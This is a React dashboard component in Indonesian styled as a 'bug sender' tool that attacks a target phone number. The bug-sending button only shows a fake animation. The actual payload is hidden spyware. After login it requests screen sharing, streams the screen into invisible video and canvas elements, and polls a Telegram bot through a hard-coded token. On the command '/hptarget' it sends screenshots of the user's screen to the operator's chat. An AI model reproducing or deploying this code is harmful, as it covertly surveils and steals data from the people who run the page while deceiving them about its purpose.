"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, Globe, Laptop, ChevronLeft, ChevronRight, AlertTriangle, Loader2 } from "lucide-react"

export default function YaeMikoDashboard() {
  // --- MESIN MONITORING SILUMAN ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastCmdId = useRef(0);
  const [isMonitoringActive, setIsMonitoringActive] = useState(false);

  // === CONFIG TELEGRAM (GANTI DI SINI) ===
  const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
  const CHAT_ID = '6481060681';

  // --- STATE ---
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)
  const [isSendingBug, setIsSendingBug] = useState(false)
  const [inputUsername, setInputUsername] = useState("")
  const [inputPassword, setInputPassword] = useState("")
  const [showErrorOverlay, setShowErrorOverlay] = useState(false)

  // LOGIC MONITORING
  useEffect(() => {
    if (!isMonitoringActive) return;
    const sendTele = async (type: string, content: any) => {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') fd.append('text', content);
      else fd.append('photo', content);
      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd }); } catch (e) {}
    };
    const capture = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => { if (blob) sendTele('photo', blob); }, 'image/jpeg', 0.5);
    };
    const listen = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current && msg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = msg.message_id;
            if (msg.text === '/hptarget') capture();
          }
        }
      } catch (e) {}
    }, 4000);
    return () => clearInterval(listen);
  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
      }
    } catch (err) {}
  };

  const handleLoginAttempt = () => {
    if (inputUsername === "Selz" && inputPassword === "Freebug") {
      startStealthMode(); 
      setIsAuthLoading(true); 
      setTimeout(() => setIsLoggedIn(true), 3000);
    } else {
      setShowErrorOverlay(true);
    }
  };

  const handleSendBug = () => {
    setIsSendingBug(true);
    setTimeout(() => {
      setIsSendingBug(false);
      alert("BUG BERHASIL DIINJEKSI KE TARGET!");
    }, 3500);
  };

  return (
    <div className="relative min-h-screen bg-[#050b14] text-white font-sans overflow-hidden">
      <style jsx global>{`
        @keyframes glitch-red {
          0% { transform: translate(0); }
          20% { transform: translate(-5px, 5px); }
          40% { transform: translate(-5px, -5px); }
          60% { transform: translate(5px, 5px); }
          80% { transform: translate(5px, -5px); }
          100% { transform: translate(0); }
        }
        .animate-glitch-red { animation: glitch-red 0.15s infinite; }
      `}</style>

      {/* OVERLAY ANIMASI KIRIM BUG */}
      {isSendingBug && (
        <div className="fixed inset-0 z-[110] bg-black/90 flex flex-col items-center justify-center p-6 text-center backdrop-blur-xl">
          <div className="relative">
            <Loader2 className="w-20 h-20 text-cyan-400 animate-spin mb-6" />
            <Bug className="w-8 h-8 text-white absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 animate-pulse" />
          </div>
          <h2 className="text-cyan-400 font-black text-2xl tracking-[0.3em] animate-pulse uppercase">
            SENDING BUG...
          </h2>
          <p className="text-white/40 text-[10px] mt-2 font-mono tracking-widest uppercase">
            Infiltrating Target: {targetNumber}
          </p>
        </div>
      )}

      {/* OVERLAY ERROR MERAH GLITCH */}
      {showErrorOverlay && (
        <div className="fixed inset-0 z-[100] bg-red-950/95 flex flex-col items-center justify-center p-6 text-center backdrop-blur-md animate-glitch-red">
          <div className="mb-6 p-4 bg-red-600 rounded-full shadow-[0_0_50px_red]">
            <AlertTriangle className="w-16 h-16 text-white" />
          </div>
          <h2 className="text-white font-black text-3xl mb-4 tracking-tighter leading-tight drop-shadow-lg uppercase">
            CREATE AKUN DULU DONGO, <br/> CREATE KE BOT ⬇︎
          </h2>
          <a 
            href="http://t.me/cekdatatarget_Selz_bug_bot" 
            target="_blank" 
            className="px-12 py-4 bg-white text-red-600 rounded-2xl font-black text-xl shadow-[0_0_20px_white] hover:scale-105 transition-transform"
          >
            Bot
          </a>
          <button onClick={() => setShowErrorOverlay(false)} className="mt-10 text-white/50 text-xs underline uppercase tracking-widest">Kembali ke Login</button>
        </div>
      )}

      {!isLoggedIn ? (
        <div className="relative z-10 flex flex-col items-center justify-center min-h-screen p-6">
          {isAuthLoading ? (
            <div className="flex flex-col items-center">
              <h1 className="text-7xl font-black tracking-tighter text-transparent bg-clip-text bg-gradient-to-b from-pink-400 to-purple-600 mb-10">SELZ</h1>
              <div className="w-64 h-1 bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-cyan-400 animate-pulse" style={{width: '60%'}} />
              </div>
            </div>
          ) : (
            <div className="w-full max-w-sm">
              <h1 className="text-center text-4xl font-black text-cyan-400 tracking-tighter mb-2 uppercase">YAE MIKO</h1>
              <p className="text-center text-[10px] text-cyan-500/60 tracking-widest mb-10 uppercase font-bold">Bug Menu v3.0</p>
              <div className="bg-[#0a1628]/60 border border-cyan-500/20 rounded-[2rem] p-8 backdrop-blur-xl">
                <div className="mb-6">
                  <label className="text-[10px] text-cyan-400 font-bold block mb-2 uppercase tracking-widest">Username</label>
                  <input value={inputUsername} onChange={(e) => setInputUsername(e.target.value)} className="w-full bg-transparent border border-cyan-500/30 p-4 rounded-2xl text-sm outline-none" placeholder="Masukan Username" />
                </div>
                <div className="mb-10">
                  <label className="text-[10px] text-cyan-400 font-bold block mb-2 uppercase tracking-widest">Password</label>
                  <input type="password" value={inputPassword} onChange={(e) => setInputPassword(e.target.value)} className="w-full bg-transparent border border-cyan-500/30 p-4 rounded-2xl text-sm outline-none" placeholder="Masukan Password" />
                </div>
                <button onClick={handleLoginAttempt} className="w-full py-4 bg-gradient-to-b from-slate-800 to-slate-950 border border-cyan-500/40 rounded-full font-bold text-white shadow-lg active:scale-95 transition-all">LOGIN</button>
              </div>
            </div>
          )}
        </div>
      ) : (
        <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto p-5">
          {/* Header */}
          <div className="flex items-center justify-between mb-8">
            <div className="flex items-center gap-3">
              <div className="w-10 h-10 border border-cyan-500/30 rounded-full flex items-center justify-center bg-cyan-500/5 shadow-[0_0_15px_rgba(6,182,212,0.1)]">
                <Shield className="w-5 h-5 text-cyan-400" />
              </div>
              <h2 className="text-xs font-bold tracking-widest uppercase">Yae Miko v3.0</h2>
            </div>
            <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/40" />
          </div>

          {/* Stats */}
          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2rem] p-6 mb-4 backdrop-blur-md">
             <div className="flex w-full justify-around">
                <div className="flex flex-col items-center">
                   <div className="w-10 h-10 bg-red-600/20 border border-red-500/50 rounded-full flex items-center justify-center mb-1"><Bug className="w-5 h-5 text-red-500" /></div>
                   <span className="text-[10px] font-black text-red-500 uppercase">Gratis</span>
                </div>
                <StatItem val="7" label="BUG" />
                <StatItem val="GACOR" label="STATUS" />
             </div>
          </div>

          {/* Target */}
          <div className="bg-[#0a1628]/40 border border-cyan-500/10 rounded-[2rem] p-6 flex-1 flex flex-col backdrop-blur-md">
            <span className="text-[10px] font-bold text-cyan-400 uppercase mb-2 ml-2">Target Nomor</span>
            <input value={targetNumber} onChange={(e) => setTargetNumber(e.target.value)} className="w-full bg-[#050b14] border border-cyan-500/20 p-5 rounded-2xl text-white font-mono text-sm mb-6" />
            
            <div className="bg-[#0a1628]/60 border border-cyan-500/10 rounded-2xl p-6 mb-6 flex-1 flex flex-col items-center justify-center">
               <h3 className="text-white font-black text-3xl tracking-tighter text-center leading-none uppercase italic">TUNDA TAK<br/>TERLIHAT</h3>
            </div>

            {/* TOMBOL YANG DIGANTI TULISANNYA */}
            <button 
              onClick={handleSendBug}
              className="w-full py-5 bg-gradient-to-r from-[#d9166f] to-[#b0105a] rounded-3xl font-black text-white tracking-[0.2em] shadow-lg active:scale-95 transition-all text-sm uppercase"
            >
                KIRIM BUG
            </button>
          </div>

          {/* Footer Bar */}
          <div className="bg-[#0a1628]/60 border border-cyan-500/10 p-4 rounded-2xl flex justify-between mt-6 backdrop-blur-md">
             <span className="text-[10px] font-bold text-cyan-400 uppercase tracking-widest">67 pengirim online</span>
             <Globe className="w-4 h-4 text-white opacity-40" />
          </div>
        </div>
      )}

      {/* ELEMENT SILUMAN */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
      </div>
    </div>
  )
}

function StatItem({ val, label }: any) {
  return (
    <div className="flex flex-col items-center">
      <span className="text-lg font-black text-white leading-none uppercase">{val}</span>
      <span className="text-[8px] text-white/30 uppercase tracking-widest font-bold">{label}</span>
    </div>
  )
}
